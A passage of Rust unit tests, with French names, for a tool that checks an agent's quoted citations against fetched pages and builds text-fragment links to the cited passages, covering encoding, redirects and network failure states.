        assert_eq!(adresse_du_passage("https://a.org/x#:~:text=ancien", Some("mot")), "https://a.org/x#:~:text=mot");
        // Un passage long : son debut et sa fin.
        let long = "un deux trois quatre cinq six sept huit neuf dix onze douze treize quatorze";
        assert_eq!(adresse_du_passage("https://a.org/", Some(long)), "https://a.org/#:~:text=un%20deux%20trois%20quatre%20cinq%20six,onze%20douze%20treize%20quatorze");
        // Les accents partent en octets UTF-8.
        assert!(adresse_du_passage("https://a.org/", Some("année")).ends_with("ann%C3%A9e"));
    }

    #[test]
    fn la_lecture_du_reseau_devient_l_etat_de_la_feuille() {
        use crate::reseau::{Issue, Lu};
        let lu = |texte: &str, redirection: Option<&str>| {
            Issue::Page(Lu { url: "https://a.org/ok".into(), redirection: redirection.map(Into::into), titre: "T".into(), texte: texte.into(), tronquee: false, octets: 10 })
        };
        let lecture = crate::suivi::Lecture {
            invite: "Quote it".into(),
            citations: vec!["Le seuil de Unity Personal est de 200 000 $ de revenus par année".into()],
            lu_le: "2026-10-29T10:00:00Z".into(),
            repondue: true,
        };
        let (e, p) = etat_de_l_issue("https://a.org/ok", &lu(PAGE, None), Some(&lecture), "2026-10-29");
        assert!(matches!(e, Etat::Passage(_)), "{e:?}");
        let p = p.unwrap();
        assert_eq!((p.invite.as_str(), p.releve.as_str()), ("Quote it", "2026-10-29"));
        // Page lue, citation absente de la page : introuvable, jamais un faux passage.
        let (e, _) = etat_de_l_issue("https://a.org/ok", &lu("Une tout autre page sans rien de cite.", None), Some(&lecture), "2026-10-29");
        assert!(matches!(e, Etat::Introuvable { .. }), "{e:?}");
        // Rien cite : la page s'ouvre en haut, et la feuille le dit.
        let (e, _) = etat_de_l_issue("https://a.org/ok", &lu(PAGE, None), None, "2026-10-29");
        assert!(matches!(e, Etat::SansPassage { .. }), "{e:?}");
        // Redirection vers un autre hote : dite, avec ce qu'on y a lu.
        let (e, _) = etat_de_l_issue("https://a.org/ok", &lu(PAGE, Some("b.org")), Some(&lecture), "2026-10-29");
        assert!(matches!(e, Etat::Redirection { ref vers, .. } if vers == "b.org"), "{e:?}");
        for (i, attendu) in [
            (Issue::Fichier, Etat::Fichier),
            (Issue::Connexion, Etat::Connexion),
            (Issue::Absente, Etat::Echec(Echec::Absente)),
            (Issue::Statut(503), Etat::Echec(Echec::Serveur(503))),
            (Issue::Certificat, Etat::Echec(Echec::Certificat)),
            (Issue::Delai, Etat::Echec(Echec::Delai)),
            (Issue::HorsLigne, Etat::HorsLigne),
            (Issue::Local, Etat::Local),
            (Issue::Refuse("file".into()), Etat::Refuse("file".into())),
        ] {
            assert_eq!(etat_de_l_issue("https://a.org/ok", &i, None, "").0, attendu);
        }
    }


    #[test]
    fn l_adresse_a_ouvrir_suit_ce_que_la_feuille_a_trouve() {
        let p = pages();
        let url = "https://a.org/ok";
        let (a, t) = adresse_a_ouvrir(url, &resoudre(url, &p, None, false));
        assert_eq!(a, "https://a.org/ok#:~:text=Le%20seuil%20de%20Unity%20Personal%20est,de%20revenus%20par%20ann%C3%A9e");
        assert!(t.unwrap().starts_with("Le seuil"));
        // Introuvable dans le texte lu : la citation de l'agent est tentee quand meme.
        let (a, t) = adresse_a_ouvrir("https://a.org/absente", &resoudre("https://a.org/absente", &p, None, false));
        assert!(a.contains("#:~:text=une%20phrase") && t.is_some(), "{a}");
        // Aucun passage cite : la page s'ouvre en haut, sans script de recherche.
        assert_eq!(adresse_a_ouvrir("https://a.org/aucune", &resoudre("https://a.org/aucune", &p, None, false)), ("https://a.org/aucune".to_string(), None));
        // Sous une redirection, la meme chose.
        let (a, _) = adresse_a_ouvrir(url, &resoudre(url, &p, Some(Reseau::Redirection), false));
        assert!(a.contains("#:~:text="));
    }

}
